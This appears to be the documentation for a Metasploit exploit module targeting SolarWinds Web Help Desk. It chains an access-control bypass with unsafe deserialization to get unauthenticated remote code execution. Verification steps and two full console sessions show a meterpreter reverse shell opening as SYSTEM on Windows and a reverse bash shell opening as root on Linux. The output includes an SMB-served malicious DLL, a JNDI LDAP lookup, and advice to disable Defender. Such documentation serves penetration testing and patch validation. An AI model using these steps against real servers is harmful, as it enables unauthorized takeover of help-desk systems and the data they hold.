## Vulnerable Application
This module exploits an access control bypass vulnerability (CVE-2025-40536) and an unsafe deserialization
vulnerability (CVE-2025-40551) to achieve unauthenticated RCE against a vulnerable SolarWinds Web Help Desk (WHD)
server.

## Testing
The following [documentation](https://documentation.solarwinds.com/en/success_center/whd/content/helpdeskinstallstand-alonedeployment.htm)
shows how to install a copy of Web Help Desk as a standalone installation on either Linux ow Windows.

## Verification Steps

1. Start msfconsole
2. `use exploit/multi/http/solarwinds_webhelpdesk_rce`

Configure the target:

3. `set RHOST <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_HTTP_OR_HTTPS_PORT>` (If different from the default of 8443)
5. `set SSL true` (Or set to false if targeting HTTP)

Find out the target version and platform, so we know what target to set:

6. `check`

Based on the above output, pick a suitable target:

7. `show targets`
8. `set target 0`

Configure the payload to execute:

9. `set PAYLOAD windows/x64/meterpreter_reverse_tcp`
10. `set LHOST eth0`
11. `set LPORT 4444`
12. `set SRVHOST eth0`

Run the module:

13. `exploit`

## Scenarios

### Example 1 - WHD 12.8.8.2528 on Windows

_NOTE:_ If you are using the default Metasploit payloads you will have to disable Defender while testing, alternatively
bring your own payloads.

_NOTE:_ You need to run MSF as root so you can bind to a low port (445 for the SMB server). Also, open your firewall
for ingress connections.

```
msf > use exploit/multi/http/solarwinds_webhelpdesk_rce 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(multi/http/solarwinds_webhelpdesk_rce) > set RHOST 192.168.86.146
RHOST => 192.168.86.146
msf exploit(multi/http/solarwinds_webhelpdesk_rce) > check
[+] 192.168.86.146:8443 - The target is vulnerable. Detected Web Help Desk version 12.8.8.2528 (windows).
msf exploit(multi/http/solarwinds_webhelpdesk_rce) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   WHD 12.8.* on Windows (Native code payload)
    1   WHD 12.8.* on Linux (Command payload)
    2   WHD 12.7.* on Windows (Command payload)
    3   WHD 12.7.* on Linux (Command payload)


msf exploit(multi/http/solarwinds_webhelpdesk_rce) > show options 

Module options (exploit/multi/http/solarwinds_webhelpdesk_rce):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   LDIF_FILE                     no        Directory LDIF file path
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: http, sapni, socks4, socks5, socks5h
   RHOSTS       192.168.86.146   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        8443             yes       The target port (TCP)
   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all address
                                           es.
   SRVPORT      389              yes       The local port to listen on.
   SSL          true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Base path
   VHOST                         no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.86.122   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WHD 12.8.* on Windows (Native code payload)



View the full module info with the info, or info -d command.

msf exploit(multi/http/solarwinds_webhelpdesk_rce) > set SRVHOST eth0
SRVHOST => 192.168.86.122
msf exploit(multi/http/solarwinds_webhelpdesk_rce) > exploit 
[*] Started reverse TCP handler on 192.168.86.122:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Detected Web Help Desk version 12.8.8.2528 (windows).
[*] Step 1 - Initial session...
[*] Serving a malicious extension over an SMB share on 192.168.86.122 (SMB on TCP port 445)
[*] Step 2 - Login pref page...
[*] Step 3 - Trigger SAML object...
[*] Step 4 - Create JSON RPC bridge...
[*] Step 5 - Unsafe deserialization...
[*] Malicious SQLite extension UNC: \\192.168.86.122\vICI\QGwb.dll
[*]   Executing gadget - Registering the org.sqlite.JDBC driver
[*]   Executing gadget - Loading malicious extension over SMB
[*] Sending stage (232006 bytes) to 192.168.86.146
[*] Meterpreter session 1 opened (192.168.86.122:4444 -> 192.168.86.146:61465) at 2026-02-04 20:25:27 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-V28QNSO2H05
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > pwd
C:\Program Files\WebHelpDesk\bin\webapps\helpdesk
meterpreter > 
```

### Example 2 - WHD 12.7.11.1182 on Linux

```
msf exploit(multi/http/solarwinds_webhelpdesk_rce) > set RHOST 192.168.86.43
RHOST => 192.168.86.43
msf exploit(multi/http/solarwinds_webhelpdesk_rce) > check
[+] 192.168.86.43:8443 - The target is vulnerable. Detected Web Help Desk version 12.7.11.1182 (linux).
msf exploit(multi/http/solarwinds_webhelpdesk_rce) > show targets 

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   WHD 12.8.* on Windows (Native code payload)
    1   WHD 12.8.* on Linux (Command payload)
    2   WHD 12.7.* on Windows (Command payload)
    3   WHD 12.7.* on Linux (Command payload)


msf exploit(multi/http/solarwinds_webhelpdesk_rce) > set target 3
target => 3
msf exploit(multi/http/solarwinds_webhelpdesk_rce) > set payload cmd/unix/reverse_bash
payload => cmd/unix/reverse_bash
msf exploit(multi/http/solarwinds_webhelpdesk_rce) > show options 

Module options (exploit/multi/http/solarwinds_webhelpdesk_rce):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   LDIF_FILE                     no        Directory LDIF file path
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: http, sapni, socks4, socks5, socks5h
   RHOSTS       192.168.86.43    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        8443             yes       The target port (TCP)
   SRVHOST      192.168.86.122   yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all address
                                           es.
   SRVPORT      389              yes       The local port to listen on.
   SSL          true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Base path
   VHOST                         no        HTTP server virtual host


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.86.122   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   3   WHD 12.7.* on Linux (Command payload)



View the full module info with the info, or info -d command.

msf exploit(multi/http/solarwinds_webhelpdesk_rce) > exploit 
[*] Started reverse TCP handler on 192.168.86.122:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Detected Web Help Desk version 12.7.11.1182 (linux).
[*] Step 1 - Initial session...
[*] Step 2 - Login pref page...
[*] Step 3 - Trigger SAML object...
[*] Step 4 - Create JSON RPC bridge...
[*] Step 5 - Unsafe deserialization...
[*] Malicious JNDI URL: ldap://192.168.86.122:389/dc=jerxyf,dc=adg
[*]   Executing gadget - Malicious JNDI lookup via ch.qos.logback.core.db.JNDIConnectionSource
[*] Command shell session 2 opened (192.168.86.122:4444 -> 192.168.86.43:52134) at 2026-02-04 20:27:59 +0000

id
uid=0(root) gid=0(root) groups=0(root)
```